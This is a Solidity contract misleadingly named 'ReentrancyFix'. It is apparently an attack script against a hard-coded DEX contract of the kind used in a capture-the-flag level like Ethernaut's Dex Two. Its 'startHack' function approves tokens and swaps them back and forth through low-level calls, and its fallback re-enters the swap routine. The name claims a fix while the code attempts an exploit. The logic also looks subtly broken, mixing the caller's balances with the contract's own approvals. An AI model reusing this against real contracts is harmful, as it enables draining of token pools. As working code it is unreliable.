pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint);
    function approve(address, uint) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract ReentrancyFix {
    address immutable public DEX_TWO = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    address immutable public TOKEN1 = 0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968;
    address immutable public TOKEN2 = 0xeEBe00Ac0756308ac4AaBfD76c05c4F3088B8883;

    function startHack() external {
        IERC20(TOKEN1).approve(DEX_TWO, 1000000000000000000);
        swapTokens();
    }

    function swapTokens() public {
        uint256 token1Balance = IERC20(TOKEN1).balanceOf(msg.sender);
        uint256 amount = token1Balance / 100;
        if (amount > 0) {
            IERC20(TOKEN1).approve(DEX_TWO, amount);
            (bool success, ) = DEX_TWO.call(
                abi.encodeWithSignature("swap(address,address,uint256)", TOKEN1, TOKEN2, amount)
            );
            require(success, "swap1 failed");
            uint256 token2Balance = IERC20(TOKEN2).balanceOf(msg.sender);
            if (token2Balance > 0) {
                IERC20(TOKEN2).approve(DEX_TWO, token2Balance);
                (success, ) = DEX_TWO.call(
                    abi.encodeWithSignature("swap(address,address,uint256)", TOKEN2, TOKEN1, token2Balance)
                );
                require(success, "swap2 failed");
            }
        }
    }

    fallback() external payable {
        swapTokens();
    }
} 
